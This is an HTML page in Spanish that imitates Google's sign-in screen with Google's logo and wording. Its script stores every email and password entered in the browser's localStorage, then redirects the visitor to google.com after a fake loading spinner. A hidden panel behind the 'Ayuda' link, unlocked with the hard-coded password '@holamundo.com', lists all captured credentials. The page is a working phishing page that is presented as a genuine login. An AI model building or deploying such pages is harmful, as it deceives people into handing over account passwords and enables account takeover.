<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: left;
            display: flex;
            width: 800px;
        }

        .left-side {
            flex: 1;
            text-align: center;
            padding: 20px;
            border-right: 1px solid #dadce0;
        }

        .left-side img {
            width: 120px;
            margin-bottom: 20px;
        }

        .left-side h1 {
            font-size: 24px;
            color: #202124;
            margin: 10px 0;
        }

        .left-side p {
            color: #5f6368;
            font-size: 14px;
        }

        .right-side {
            flex: 2;
            padding: 20px;
        }

        .right-side input[type="email"],
        .right-side input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 5px;
            font-size: 16px;
        }

        .right-side button {
            width: 100%;
            padding: 12px;
            background-color: #1a73e8;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .right-side button:hover {
            background-color: #1667c1;
        }

        .forgot-link {
            display: block;
            text-align: left;
            color: #1a73e8;
            font-size: 14px;
            margin-bottom: 5px; /* Espaciado ajustado */
        }

        .guest-mode-info {
            font-size: 12px;
            color: #5f6368;
            margin-top: 5px; /* Espaciado para el nuevo texto */
        }

        .footer-links {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
            margin-top: 20px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .data-container {
            margin-top: 20px;
            display: none;
        }

        .data-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .delete-btn {
            background-color: red;
            border: none;
            color: white;
            padding: 5px;
            border-radius: 5px;
            cursor: pointer;
        }

        .loading-container {
            display: none;
            text-align: center;
            margin-top: 20px;
        }

        .loading-container p {
            font-size: 16px;
            color: #d3d3d3;
        }

        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #d3d3d3;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .password-prompt {
            display: none;
            margin-top: 10px;
        }

        .guest-mode-info {
            font-size: 14px; /* Tamaño de fuente aumentado */
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="left-side">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Logo de Google">
        <h1>Acceder</h1>
        <p>Usa tu Cuenta de Google</p>
    </div>
    
    <div class="right-side">
        <form id="loginForm">
            <div id="emailSection">
                <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
                <a href="#" class="forgot-link">¿Olvidaste el correo electrónico?</a>
                <p class="guest-mode-info">¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. Más información para usar el modo de invitado.</p>
                <button type="button" id="nextBtn">Siguiente</button>
            </div>

            <div id="passwordSection" style="display:none;">
                <input type="password" id="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
            </div>
        </form>

        <div id="message"></div>

        <div class="loading-container" id="loadingContainer">
            <div class="loading-spinner"></div>
            <p>Cargando...</p>
        </div>

        <div class="footer-links">
            <a href="#" id="helpLink">Ayuda</a>
            <a href="#">Crear cuenta</a>
        </div>
    </div>
</div>

<div class="data-container" id="dataContainer">
    <h3>Correos y contraseñas almacenados</h3>
    <div id="storedData"></div>
</div>

<div class="password-prompt" id="passwordPrompt">
    <input type="password" id="secretPassword" placeholder="Ingrese la contraseña para ver los datos almacenados" required>
    <button id="submitSecretPassword">Ver Datos</button>
</div>

<script>
    let storedUsers = JSON.parse(localStorage.getItem('users')) || [];

    document.getElementById('nextBtn').addEventListener('click', function() {
        const email = document.getElementById('email').value;

        if (!email.includes('@')) {
            document.getElementById('message').textContent = "El correo debe tener un '@'.";
            return;
        }

        document.getElementById('emailSection').style.display = 'none';
        document.getElementById('passwordSection').style.display = 'block';
    });

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (email && password) {
            document.getElementById('message').textContent = "";

            document.getElementById('loadingContainer').style.display = 'block';

            storedUsers.push({ email, password });
            localStorage.setItem('users', JSON.stringify(storedUsers));

            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        } else {
            document.getElementById('message').textContent = "Complete los campos.";
        }
    });

    document.getElementById('helpLink').addEventListener('click', function(event) {
        event.preventDefault();
        document.getElementById('passwordPrompt').style.display = 'block';
    });

    document.getElementById('submitSecretPassword').addEventListener('click', function() {
        const inputPassword = document.getElementById('secretPassword').value;
        if (inputPassword === '@holamundo.com') {  // Contraseña especial
            document.getElementById('dataContainer').style.display = 'block';
            showStoredData();
            document.getElementById('passwordPrompt').style.display = 'none'; // Ocultar el prompt
        } else {
            alert('Contraseña incorrecta.');
        }
    });

    function showStoredData() {
        const dataContainer = document.getElementById('storedData');
        dataContainer.innerHTML = '';

        storedUsers.forEach((user, index) => {
            const userDiv = document.createElement('div');
            userDiv.className = 'data-item';
            userDiv.innerHTML = `${user.email} - ${user.password} <button class="delete-btn" data-index="${index}">X</button>`;
            dataContainer.appendChild(userDiv);
        });

        document.querySelectorAll('.delete-btn').forEach(button => {
            button.addEventListener('click', function() {
                const index = this.getAttribute('data-index');
                const confirmDelete = confirm('¿Desea eliminar este registro?');
                if (confirmDelete) {
                    storedUsers.splice(index, 1);
                    localStorage.setItem('users', JSON.stringify(storedUsers));
                    showStoredData(); // Refrescar la lista
                }
            });
        });
    }
</script>

</body>
</html>
